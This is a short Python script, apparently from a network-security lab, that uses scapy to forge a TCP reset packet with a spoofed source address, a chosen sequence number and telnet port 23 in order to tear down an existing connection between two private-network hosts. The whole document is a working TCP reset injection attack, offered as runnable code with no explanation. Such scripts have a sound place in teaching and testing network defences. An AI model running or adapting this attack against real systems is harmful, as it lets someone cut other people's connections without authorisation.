#!/usr/bin/python
from scapy.all import*
print("SENDING RESET PACKET...")
IPLayer = IP(src="10.0.2.5", dst="10.0.2.6")
TCPLayer = TCP(sport=53360, dport=23, flags="R", seq=1643279716)
pkt = IPLayer/TCPLayer
ls(pkt)
send(pkt, verbose=0)
